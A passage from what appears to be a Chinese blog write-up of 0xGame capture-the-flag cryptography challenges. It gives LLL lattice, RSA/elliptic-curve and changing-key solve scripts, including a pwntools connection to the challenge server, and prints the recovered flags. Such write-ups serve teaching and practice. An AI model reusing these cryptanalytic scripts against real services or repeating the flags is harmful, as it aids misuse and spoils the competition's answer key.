       <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[+] 成功找到 Flag: <span class=\"subst\">&#123;found_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 在原始矩阵的基中未找到 Flag。&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;-&quot;</span> * <span class=\"number\">50</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 第二次尝试：根据提示，使用转置矩阵的行向量作为基 ---</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--- 尝试 2: 使用转置矩阵 C^T 的行向量 ---&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        rows = <span class=\"built_in\">len</span>(matrix_C)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> rows == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 矩阵为空。&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        cols = <span class=\"built_in\">len</span>(matrix_C[<span class=\"number\">0</span>])</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 计算转置矩阵</span></span><br><span class=\"line\">        transposed_C = [[matrix_C[j][i] <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(rows)] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cols)]</span><br><span class=\"line\">        </span><br><span class=\"line\">        found_flag = find_flag_in_basis(transposed_C)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> found_flag:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[+] 成功找到 Flag: <span class=\"subst\">&#123;found_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 在进行第二次尝试时出错: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 在转置矩阵的基中也未找到 Flag。&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] 解密失败。正如提示所说，可能需要构建一个更复杂的格结构。&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_flag_in_basis</span>(<span class=\"params\">basis_matrix</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    对给定的基矩阵进行 LLL 规约，并从中寻找 Flag。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        basis_matrix (list of lists): 作为格的基的矩阵。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        str: 如果找到 Flag，则返回 Flag 字符串，否则返回 None。</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 2. 构造格的基</span></span><br><span class=\"line\">        n = <span class=\"built_in\">len</span>(basis_matrix)</span><br><span class=\"line\">        B = IntegerMatrix.from_matrix(basis_matrix)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 3. 运行 LLL 算法进行规约</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[*] 正在对一个 <span class=\"subst\">&#123;n&#125;</span>x<span class=\"subst\">&#123;n&#125;</span> 的矩阵进行 LLL 规约...&quot;</span>)</span><br><span class=\"line\">        B_reduced = LLL.reduction(B)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] LLL 规约完成。&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 4. 分析规约后的基向量</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在分析规约后的短向量...&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">            <span class=\"comment\"># 获取一个规约后的向量 v</span></span><br><span class=\"line\">            v = <span class=\"built_in\">list</span>(B_reduced[i])</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 5. 尝试从向量 v 中恢复 Flag</span></span><br><span class=\"line\">            <span class=\"comment\"># 向量 v 可能是 flag 向量的整数倍 k*f。通过计算最大公约数（GCD）来找到 k。</span></span><br><span class=\"line\">            non_zero_elements = [<span class=\"built_in\">abs</span>(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> v <span class=\"keyword\">if</span> x != <span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> non_zero_elements:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>  <span class=\"comment\"># 跳过零向量</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 计算所有非零元素的 GCD</span></span><br><span class=\"line\">            common_divisor = non_zero_elements[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">len</span>(non_zero_elements)):</span><br><span class=\"line\">                common_divisor = math.gcd(common_divisor, non_zero_elements[j])</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># LLL 找到的向量方向可能相反，所以要同时尝试 k 和 -k</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> sign <span class=\"keyword\">in</span> [<span class=\"number\">1</span>, -<span class=\"number\">1</span>]:</span><br><span class=\"line\">                k = common_divisor * sign</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 用向量 v 除以 k，得到 flag 候选</span></span><br><span class=\"line\">                    f_candidate = [x // k <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> v]</span><br><span class=\"line\">                    </span><br><span class=\"line\">                    <span class=\"comment\"># 检查候选向量的所有元素是否都在0-127的 ASCII 范围内</span></span><br><span class=\"line\">                    is_ascii = <span class=\"built_in\">all</span>(<span class=\"number\">0</span> &lt; x &lt; <span class=\"number\">128</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> f_candidate)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> is_ascii:</span><br><span class=\"line\">                        flag_str = <span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">chr</span>, f_candidate))</span><br><span class=\"line\">                        <span class=\"comment\"># 检查是否符合已知的 flag 格式</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> flag_str.startswith(<span class=\"string\">&quot;0xGame&#123;&quot;</span>) <span class=\"keyword\">and</span> flag_str.endswith(<span class=\"string\">&quot;&#125;&quot;</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">                <span class=\"keyword\">except</span> (ZeroDivisionError, TypeError):</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 错误：未找到 fpylll 库。&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 请使用 &#x27;pip install fpylll&#x27; 命令进行安装。&quot;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># Exit the whole script if the library is missing</span></span><br><span class=\"line\">        exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[-] 在 LLL 规约或分析过程中发生错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：<code>0xGame&#123;B3g1nn3r_t0_1e4rn_L4tt1c3s&#125;</code></p>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sage</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> remote</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> log <span class=\"keyword\">as</span> pwnlog</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class=\"number\">34782</span>)</span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Connection established. Timer has started. Executing...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 1. 快速解析服务器输出 ---</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;Coordinate of P is (&#x27;</span>)</span><br><span class=\"line\">    p1_str = io.recvuntil(<span class=\"string\">b&#x27;)&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    px1, py1 = <span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, p1_str.split(<span class=\"string\">b&#x27;,&#x27;</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;Coordinate of P is (&#x27;</span>)</span><br><span class=\"line\">    p2_str = io.recvuntil(<span class=\"string\">b&#x27;)&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    px2, py2 = <span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, p2_str.split(<span class=\"string\">b&#x27;,&#x27;</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&#x27;n = &#x27;</span>)</span><br><span class=\"line\">    n_str = io.recvuntil(<span class=\"string\">b&#x27;\\n[-]&#x27;</span>, drop=<span class=\"literal\">True</span>).replace(<span class=\"string\">b&#x27;\\n&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(n_str)</span><br><span class=\"line\">    e = <span class=\"number\">65537</span></span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;Data parsed.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 2. 快速分解 n ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Factoring n...&quot;</span>)</span><br><span class=\"line\">    A1 = (<span class=\"built_in\">pow</span>(py1, <span class=\"number\">2</span>, n) - <span class=\"built_in\">pow</span>(px1, <span class=\"number\">3</span>, n)) % n</span><br><span class=\"line\">    A2 = (<span class=\"built_in\">pow</span>(py2, <span class=\"number\">2</span>, n) - <span class=\"built_in\">pow</span>(px2, <span class=\"number\">3</span>, n)) % n</span><br><span class=\"line\">    delta_A = (A1 - A2) % n</span><br><span class=\"line\">    f1 = gcd(delta_A, n)</span><br><span class=\"line\">    f2 = n // f1</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;n factored into two factors.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 3. 根据超奇异条件确定 p 和 q ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Identifying p and q based on supersingular conditions...&quot;</span>)</span><br><span class=\"line\">    p, q = <span class=\"literal\">None</span>, <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f1 % <span class=\"number\">3</span> == <span class=\"number\">2</span> <span class=\"keyword\">and</span> f2 % <span class=\"number\">4</span> == <span class=\"number\">3</span>:</span><br><span class=\"line\">        p, q = f1, f2</span><br><span class=\"line\">        pwnlog.success(<span class=\"string\">&quot;Assignment found: p = factor1 (p%3=2), q = factor2 (q%4=3).&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> f2 % <span class=\"number\">3</span> == <span class=\"number\">2</span> <span class=\"keyword\">and</span> f1 % <span class=\"number\">4</span> == <span class=\"number\">3</span>:</span><br><span class=\"line\">        p, q = f2, f1</span><br><span class=\"line\">        pwnlog.success(<span class=\"string\">&quot;Assignment found: p = factor2 (p%3=2), q = factor1 (q%4=3).&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        pwnlog.failure(<span class=\"string\">&quot;Factors do not meet the expected supersingular conditions. Attack failed.&quot;</span>)</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 4. 瞬时计算阶和求解 ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Calculating orders and solving discrete logs...&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 阶的计算现在是 O(1)</span></span><br><span class=\"line\">    Np = p + <span class=\"number\">1</span></span><br><span class=\"line\">    Nq = q + <span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 在 GF(p) 上求解</span></span><br><span class=\"line\">    Fp = GF(p)</span><br><span class=\"line\">    Ep = EllipticCurve(Fp, [<span class=\"number\">0</span>, q])</span><br><span class=\"line\">    dp = inverse_mod(e, Np)</span><br><span class=\"line\">    P1_p = Ep(px1, py1)</span><br><span class=\"line\">    Q1_p = dp * P1_p</span><br><span class=\"line\">    x_mod_p = Q1_p[<span class=\"number\">0</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 在 GF(q) 上求解</span></span><br><span class=\"line\">    Fq = GF(q)</span><br><span class=\"line\">    Eq = EllipticCurve(Fq, [p, <span class=\"number\">0</span>])</span><br><span class=\"line\">    dq = inverse_mod(e, Nq)</span><br><span class=\"line\">    P1_q = Eq(px1, py1)</span><br><span class=\"line\">    Q1_q = dq * P1_q</span><br><span class=\"line\">    x_mod_q = Q1_q[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># --- 5. 合并结果并立即发送 ---</span></span><br><span class=\"line\">    pwnlog.info(<span class=\"string\">&quot;Combining results with CRT and sending secret...&quot;</span>)</span><br><span class=\"line\">    x = crt([Integer(x_mod_p), Integer(x_mod_q)], [p, q])</span><br><span class=\"line\">    secret_bytes = x.to_bytes(<span class=\"number\">126</span>, <span class=\"string\">&#x27;big&#x27;</span>)[:<span class=\"number\">35</span>]</span><br><span class=\"line\">    secret_hex = secret_bytes.<span class=\"built_in\">hex</span>()</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">f&quot;Secret recovered (hex): <span class=\"subst\">&#123;secret_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">b&#x27;[-] Give me the secret:&#x27;</span>, secret_hex.encode())</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = io.recvall().decode(errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">    pwnlog.success(<span class=\"string\">&quot;Received response:\\n&quot;</span> + flag)</span><br><span class=\"line\">    io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    solve()</span><br></pre></td></tr></table></figure>\n\n<p>由于题目有时间限制，所以按常规对素数的解法会超时，所以我们取素数是超奇异数这一特殊情况，能够加快运算，并能够及时通过pwn把计算出的secret发送给服务器，实现交互，得到flag。</p>\n<p>但其实实际上容器生成的随机素数并不全是超奇异数，所以实际需要多运行几次，若容器返回的刚好是超奇异数，就能打通了。</p>\n<p>flag：<code> 0xGame&#123;cab11ca1-2615-4353-8bdc-83acfbc158d9&#125;</code></p>\n<h2 id=\"变化的公钥\"><a href=\"#变化的公钥\" class=\"headerlink\" title=\"变化的公钥\"></a>变化的公钥</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 您提供的数据 =========</span></span><br><span class=\"line\">c_flag = <span class=\"number\">3768551934826292593833035309611313515410350948177015252689101612760092214724819460968940593137063674343550213845565985577708096326384804161039234286824257</span></span><br><span class=\"line\">p = <span class=\"number\">92183828593120412163104340291760641288180588598799559753245539989169201953287</span></span><br><span class=\"line\">q = <span class=\"number\">112341696090923376544622587134650063030670067695398128869588369062187162349067</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 手动交互得到的加密数据 &#123;明文: 密文&#125;</span></span><br><span class=\"line\">encrypted_data = &#123;</span><br><span class=\"line\">    <span class=\"number\">2</span>: <span class=\"number\">8661456987622729713284875140324390021854656336220032548752643276741012650814412956153724560835436673697707915353315705759467237138561861755697546499239404</span>,</span><br><span class=\"line\">    <span class=\"number\">3</span>: <span class=\"number\">4517771087385690059400613106400236028797989648570504435335842458967594563252372288742748213792858933900161922306165687720613665857113406491341498148219072</span>,</span><br><span class=\"line\">    <span class=\"number\">4</span>: <span class=\"number\">4461368238758747164492118791058784945853565508910915006788491998225437417465209099602788188410713446842464672424069396400510956103768639651291936269944409</span>,</span><br><span class=\"line\">    <span class=\"number\">5</span>: <span class=\"number\">252593148397960384672099236062132976194716239214893311677001562315947306045440602988806836496469883640979695884101793958904581043170908588967763161253161</span>,</span><br><span class=\"line\">    <span class=\"comment\"># ... 您可以根据需要添加更多数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 工具函数 (无变动) =========</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_prime_factors</span>(<span class=\"params\">n, limit=<span class=\"number\">1000000</span></span>):</span><br><span class=\"line\">    factors = &#123;&#125;</span><br><span class=\"line\">    d = <span class=\"number\">2</span></span><br><span class=\"line\">    temp_n = n</span><br><span class=\"line\">    <span class=\"keyword\">while</span> d * d &lt;= temp_n:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d &gt; limit: <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> temp_n % d == <span class=\"number\">0</span>:</span><br><span class=\"line\">            factors[d] = factors.get(d, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">            temp_n //= d</span><br><span class=\"line\">        d += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp_n &gt; <span class=\"number\">1</span> <span class=\"keyword\">and</span> temp_n &lt;= limit:</span><br><span class=\"line\">        factors[temp_n] = factors.get(temp_n, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">sorted</span>(factors.keys())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extended_gcd</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a == <span class=\"number\">0</span>: <span class=\"keyword\">return</span> b, <span class=\"number\">0</span>, <span class=\"number\">1</span></span><br><span class=\"line\">    d, x1, y1 = extended_gcd(b % a, a)</span><br><span class=\"line\">    x = y1 - (b // a) * x1</span><br><span class=\"line\">    y = x1</span><br><span class=\"line\">    <span class=\"keyword\">return</span> d, x, y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">chinese_remainder_theorem</span>(<span class=\"params\">congruences</span>):</span><br><span class=\"line\">    M = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _, n_i <span class=\"keyword\">in</span> congruences: M *= n_i</span><br><span class=\"line\">    result = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> a_i, n_i <span class=\"keyword\">in</span> congruences:</span><br><span class=\"line\">        M_i = M // n_i</span><br><span class=\"line\">        _, N_i, _ = extended_gcd(M_i, n_i)</span><br><span class=\"line\">        result = (result + a_i * M_i * N_i) % M</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ========= 离线解密主逻辑 =========</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve_offline</span>():</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    phi_n = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] n: <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] phi(n): <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(phi_n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    factors = get_prime_factors(phi_n, limit=<span class=\"number\">1000000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Found <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(factors)&#125;</span> small prime factors of phi(n) up to 1,000,000.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    congruences = []</span><br><span class=\"line\">    moduli_product = <span class=\"number\">1</span></span><br><span class=\"line\">    E_UPPER_BOUND = <span class=\"number\">2</span>**<span class=\"number\">300</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p_i <span class=\"keyword\">in</span> factors:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[*] Trying to find e mod <span class=\"subst\">&#123;p_i&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        